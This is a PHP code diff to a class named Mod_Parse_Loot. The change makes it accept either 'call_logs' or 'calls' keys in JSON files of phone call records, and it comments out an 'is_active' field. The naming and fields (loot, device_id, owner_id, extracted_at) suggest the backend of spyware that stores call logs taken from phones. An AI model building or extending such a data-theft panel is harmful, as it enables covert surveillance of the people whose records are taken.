@@ -121,22 +121,25 @@ class Mod_Parse_Loot extends Model
             }
 
             $json = json_decode($loot_decoded, true);
-        if ($json === null || !isset($json['call_logs']) || !is_array($json['call_logs'])) {
-            log_message('error', 'Invalid JSON structure in call logs file: ' . $file_name);
-            log_message('debug', 'JSON keys found: ' . implode(', ', array_keys($json ?? [])));
-            log_message('debug', 'Expected key: call_logs');
-            return false;
-        }
+            
+            // Handle both legacy 'call_logs' and modern 'calls' keys
+            $callLogData = $json['call_logs'] ?? $json['calls'] ?? null;
+            
+            if ($json === null || !is_array($callLogData)) {
+                log_message('error', 'Invalid JSON structure in call logs file: ' . $file_name);
+                log_message('debug', 'JSON keys found: ' . implode(', ', array_keys($json ?? [])));
+                return false;
+            }
 
             $extracted_at = $json['extracted_at'] ?? null;
 
             $batchData = [];
-        $skippedCount = 0;
-        $duplicateCount = 0;
-        
-        log_message('info', 'Processing ' . count($json['call_logs']) . ' call logs from ' . $file_name);
-        
-        foreach ($json['call_logs'] as $log) {
+            $skippedCount = 0;
+            $duplicateCount = 0;
+            
+            log_message('info', 'Processing ' . count($callLogData) . ' call logs from ' . $file_name);
+            
+            foreach ($callLogData as $log) {
             if (!isset($log['phone_number']) || !isset($log['call_date'])) {
                 $skippedCount++;
                 log_message('debug', 'Skipped call log - missing required fields: ' . json_encode($log));
@@ -164,7 +167,7 @@ class Mod_Parse_Loot extends Model
                     'device_id'          => $var_file_print,
                     'extracted_at'       => $extracted_at ? date('Y-m-d H:i:s', substr($extracted_at, 0, -3)) : null,
                     'owner_id'           => $var_file_owner,
-                    'is_active'          => 1,
+//                    'is_active'          => 1,
                     'created_at'         => $dated,
                     'updated_at'         => $dated,
                 ];
